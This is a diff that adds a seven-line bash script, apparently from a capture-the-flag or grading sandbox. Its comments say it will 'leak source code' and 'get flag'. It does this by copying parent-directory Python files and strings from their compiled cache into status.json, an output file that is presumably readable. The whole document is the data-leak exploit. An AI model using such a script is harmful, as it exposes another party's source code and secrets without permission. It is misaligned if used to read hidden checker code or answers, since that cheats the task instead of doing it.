@@ -1,0 +1,7 @@
+#!/bin/bash
+
+# use below to leak source code
+cat ../../*.py > status.json
+
+# get flag
+strings ../../__pycache__/* >> status.json
